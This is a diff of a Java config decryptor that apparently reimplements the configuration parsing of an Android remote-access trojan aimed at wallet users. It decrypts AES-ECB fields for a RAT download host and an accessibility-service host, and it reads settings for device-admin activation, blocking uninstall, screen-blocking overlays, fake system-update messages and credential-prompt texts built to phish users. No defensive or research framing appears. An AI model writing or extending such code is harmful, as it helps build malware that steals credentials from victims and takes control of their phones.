@@ -25,39 +25,92 @@ public class ConfigDecryptor {
 
     /**
      * 解密配置文件 JSON
+     * ADAPT: vendor = com.guard.wallet.utils.d.a() — 解析 config.json 全部字段
      */
     public static AppConfig decrypt(String encryptedJson) throws Exception {
         JsonObject json = JsonParser.parseString(encryptedJson).getAsJsonObject();
 
         AppConfig config = new AppConfig();
 
-        // 解密加密字段
+        // 加密字段 (AES-ECB 解密)
         if (json.has("serverHost")) {
             config.setServerHost(decryptValue(json.get("serverHost").getAsString()));
         }
         if (json.has("downloadRatHatHost")) {
-            config.setDownloadHost(decryptValue(json.get("downloadRatHatHost").getAsString()));
+            config.setDownloadRatHatHost(decryptValue(json.get("downloadRatHatHost").getAsString()));
         }
         if (json.has("guideAccessibilityHost")) {
-            config.setWebSocketUrl(decryptValue(json.get("guideAccessibilityHost").getAsString()));
+            config.setGuideAccessibilityHost(decryptValue(json.get("guideAccessibilityHost").getAsString()));
         }
 
-        // 非加密字段
-        if (json.has("perScreenOffDuration")) {
-            config.setPerScreenOffDuration(json.get("perScreenOffDuration").getAsInt());
-        }
-        if (json.has("perIdleDuration")) {
-            config.setPerIdleDuration(json.get("perIdleDuration").getAsInt());
-        }
+        // 非加密字段 — 直接读取
+        setStringIfPresent(json, "downloadRatHatName", config::setDownloadRatHatName);
+        setStringIfPresent(json, "mainUrl", config::setMainUrl);
+        setStringIfPresent(json, "blockIconUrl", config::setBlockIconUrl);
+        setStringIfPresent(json, "blockBgColor", config::setBlockBgColor);
+        setStringIfPresent(json, "trusteeId", config::setTrusteeId);
+        setStringIfPresent(json, "mainActivity", config::setMainActivity);
+
+        // 整数字段
+        setIntIfPresent(json, "promotionModel", config::setPromotionModel);
+        setIntIfPresent(json, "uninstall", config::setUninstall);
+        setIntIfPresent(json, "activeAdmin", config::setActiveAdmin);
+        setIntIfPresent(json, "debug", config::setDebug);
+        setIntIfPresent(json, "perScreenOffDuration", config::setPerScreenOffDuration);
+        setIntIfPresent(json, "perIdleDuration", config::setPerIdleDuration);
+
+        // UI 文本字段 (中文/多语言)
+        setStringIfPresent(json, "alertTitle", config::setAlertTitle);
+        setStringIfPresent(json, "alertMsg", config::setAlertMsg);
+        setStringIfPresent(json, "alertRestrictedMsg", config::setAlertRestrictedMsg);
+        setStringIfPresent(json, "okText", config::setOkText);
+        setStringIfPresent(json, "exitConfirm", config::setExitConfirm);
+        setStringIfPresent(json, "allowRestricted", config::setAllowRestricted);
+        setStringIfPresent(json, "appLabel", config::setAppLabel);
+        setStringIfPresent(json, "accessibilityServiceLabel", config::setAccessibilityServiceLabel);
+        setStringIfPresent(json, "launcherLabel", config::setLauncherLabel);
+        setStringIfPresent(json, "aliveBlockMsg", config::setAliveBlockMsg);
+        setStringIfPresent(json, "updateSystemMsg", config::setUpdateSystemMsg);
+        setStringIfPresent(json, "wifiBlockMsg", config::setWifiBlockMsg);
+        setStringIfPresent(json, "notificationTitle", config::setNotificationTitle);
+        setStringIfPresent(json, "notificationContent", config::setNotificationContent);
+        setStringIfPresent(json, "appCredentialTitle", config::setAppCredentialTitle);
+        setStringIfPresent(json, "appCredentialSubTitle", config::setAppCredentialSubTitle);
+        setStringIfPresent(json, "appCredentialDescription", config::setAppCredentialDescription);
+        setStringIfPresent(json, "appCredentialInitMsg", config::setAppCredentialInitMsg);
+        setStringIfPresent(json, "updateCredentialTitle", config::setUpdateCredentialTitle);
+        setStringIfPresent(json, "updateCredentialSubTitle", config::setUpdateCredentialSubTitle);
+        setStringIfPresent(json, "updateCredentialDescription", config::setUpdateCredentialDescription);
 
         return config;
+    }
+
+    private interface StringSetter { void set(String value); }
+    private interface IntSetter { void set(Integer value); }
+
+    private static void setStringIfPresent(JsonObject json, String key, StringSetter setter) {
+        if (json.has(key) && !json.get(key).isJsonNull()) {
+            setter.set(json.get(key).getAsString());
+        }
+    }
+
+    private static void setIntIfPresent(JsonObject json, String key, IntSetter setter) {
+        if (json.has(key) && !json.get(key).isJsonNull()) {
+            setter.set(json.get(key).getAsInt());
+        }
     }
 
     /**
      * AES-ECB 解密单个值
      */
     public static String decryptValue(String encrypted) throws Exception {
-        byte[] decoded = Base64.decode(encrypted, Base64.URL_SAFE);
+        // ADAPT: vendor 用标准 Base64 (含 +/)，先尝试标准再尝试 URL_SAFE
+        byte[] decoded;
+        try {
+            decoded = Base64.decode(encrypted, Base64.DEFAULT);
+        } catch (Exception e) {
+            decoded = Base64.decode(encrypted, Base64.URL_SAFE);
+        }
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
         cipher.init(Cipher.DECRYPT_MODE, keySpec);
